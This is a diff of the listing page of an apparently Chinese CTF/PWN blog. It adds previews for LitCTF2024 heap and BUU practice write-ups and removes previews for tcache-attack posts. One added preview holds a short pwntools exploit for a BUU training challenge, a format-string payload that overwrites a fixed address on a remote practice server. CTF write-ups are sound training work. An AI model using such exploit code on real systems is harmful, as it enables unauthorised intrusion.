@@ -134,6 +134,63 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/2024-litctf-wp/" title="非常好堆题，使我的patchelf旋转。">『LitCTF2024』 PWN WP</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-06-04  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>虽然说是新生赛，但是五道堆题估计真新生都被吓傻了。实际上题目限制非常宽松，也正好可以拿来总结各个常见版本glibc的基本特点。因为题目除了2.39之外都一样所以就先分析题目，再来看不同版本下的做法。</p>
+<h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h3>
+	
+	</div>
+  <a type="button" href="/2024/2024-litctf-wp/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/buu-wp-1/" title="猛猛刷题第一页，但是前面几道题很久之前做的了懒得找了，所以不写了。题目比较简单，所以不写过程了，个别除外。">『BUU』刷题记录（一）</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-05-29  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29513</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3>
+	
+	</div>
+  <a type="button" href="/2024/buu-wp-1/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/glibc-exit-hook/" title="glibc2.31，但是适用于glibc2.34及以前的版本">『glibc源码补完计划』exit_hook</a>
 		</h3>
 		</div>
@@ -352,62 +409,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/tcache-attack/" title="除非特别说明，默认为glibc_2.35">『Heap Exploitation』tcache_attack</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-02-17  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="TcacheBin-Attack"><a href="#TcacheBin-Attack" class="headerlink" title="TcacheBin Attack"></a>TcacheBin Attack</h2><p>根据源代码我们可以得知，高版本的glibc给tcachebin引入了检查机制，使得攻击没那么方便了，但正所谓道高一尺魔高一丈，没有攻不破的系统，只有不努力的黑客。tcache的检查机制主要有两个：对double free的检查和对chunk对齐的检查。前者的分析见<a target="_blank" rel="noopener" href="https://c-lby.github.io/2024/02/14/glibc_tcachebin/#TcacheBin%E5%AD%98%E5%8F%96chunk">TcacheBin存取chunk</a>。这里对chunk对齐的机制进行溯源。</p>
-<h3 id="chunk对齐检查机制"><a href="#chunk对齐检查机制" class="headerlink" title="chunk对齐检查机制"></a>chunk对齐检查机制</h3>
-	
-	</div>
-  <a type="button" href="/2024/tcache-attack/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/glibc_tcachebin/" title="glibc_2.35（版本较高，注意版本区别）">『glibc源码补完计划』TcacheBin</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-02-14  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h2><p>tcache全称 thread local caching，TcacheBin是从glibc2.26才开始加入的缓存机制，访问速度比fastbin更快，优先级更高，相对的检查机制也比较弱，容易攻击。</p>
-<h3 id="TcacheBin相关数据结构"><a href="#TcacheBin相关数据结构" class="headerlink" title="TcacheBin相关数据结构"></a>TcacheBin相关数据结构</h3>
-	
-	</div>
-  <a type="button" href="/2024/glibc_tcachebin/#more" class="btn btn-default more">阅读此文</a>
-</div>
-
-		
 
 		</div>
 
@@ -423,7 +424,7 @@
 
         <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
  
-          <a type="button" class="btn btn-default disabled">下一页<i class="fa fa-arrow-circle-o-right"></i></a>
+       <a href="/page/6/" type="button" class="btn btn-default ">下一页<i class="fa fa-arrow-circle-o-right"></i></a>     
         
 
   
@@ -459,7 +460,7 @@
 		
 			<li><a href="/categories/Linux/">Linux<span>1</span></a></li>
 		
-			<li><a href="/categories/WP/">WP<span>14</span></a></li>
+			<li><a href="/categories/WP/">WP<span>15</span></a></li>
 		
 			<li><a href="/categories/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
 		
@@ -485,6 +486,8 @@
 		
 			<li><a href="/categories/图灵完备/">图灵完备<span>4</span></a></li>
 		
+			<li><a href="/categories/逃逸/">逃逸<span>1</span></a></li>
+		
 		</ul>
 	</div>
 
@@ -494,48 +497,48 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/linux/">linux<span>1</span></a></li>
-		
-			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
+			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
 		
 			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
 		
-			<li><a href="/tags/图灵完备/">图灵完备<span>4</span></a></li>
-		
-			<li><a href="/tags/编译原理/">编译原理<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>26</span></a></li>
 		
 			<li><a href="/tags/diary/">diary<span>14</span></a></li>
 		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
+			<li><a href="/tags/图灵完备/">图灵完备<span>4</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>6</span></a></li>
+			<li><a href="/tags/PWN/">PWN<span>30</span></a></li>
 		
-			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
+			<li><a href="/tags/计组/">计组<span>4</span></a></li>
+		
+			<li><a href="/tags/namespace/">namespace<span>1</span></a></li>
 		
 			<li><a href="/tags/ubuntu/">ubuntu<span>1</span></a></li>
 		
-			<li><a href="/tags/protobuf/">protobuf<span>2</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>25</span></a></li>
-		
-			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
-		
-			<li><a href="/tags/docker/">docker<span>1</span></a></li>
-		
 			<li><a href="/tags/hexagon/">hexagon<span>3</span></a></li>
-		
-			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
-		
-			<li><a href="/tags/llvm/">llvm<span>2</span></a></li>
 		
 			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
 		
+			<li><a href="/tags/linux/">linux<span>1</span></a></li>
+		
 			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
 		
-			<li><a href="/tags/PWN/">PWN<span>29</span></a></li>
+			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
+		
+			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
+		
+			<li><a href="/tags/WP/">WP<span>19</span></a></li>
+		
+			<li><a href="/tags/llvm/">llvm<span>2</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>6</span></a></li>
+		
+			<li><a href="/tags/编译原理/">编译原理<span>1</span></a></li>
+		
+			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>22</span></a></li>
+		   <li><a href="/tags">...<span>25</span></a></li>
 		 
 		</ul>
 	</div>
@@ -546,6 +549,10 @@
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2025/chroot-ns-escape/"  title="https://pwn.college/system-security/sandboxing/  并不一定适用于所有发行版，有些发行版可能已经修复这些漏洞了（实测ubuntu24已经修复chroot工作目录的漏洞了，但是fd漏洞可以用；ubuntu20都可以用）" ><i class="fa fa-file-o"></i>chroot&amp;namespace逃逸总结</a>
+      </li>
     
       <li>
         <a href="/2025/ubuntu-opera-html5/"  title="2025.03.12" ><i class="fa fa-file-o"></i>解决ubuntu桌面中opera浏览无法支持html5...</a>
@@ -561,10 +568,6 @@
     
       <li>
         <a href="/2024/2024geekctf-stkbof/"  title="非常好架构，使我的IDA旋转" ><i class="fa fa-file-o"></i>『2024GeekCTF』stkbof-初识hexag...</a>
-      </li>
-    
-      <li>
-        <a href="/2024/2024GCBCTF-wp/"  title="2024国城杯初赛，pwn题挺水的，被打烂了" ><i class="fa fa-file-o"></i>『国城杯2024』PWN WP</a>
       </li>
     
   </ul>
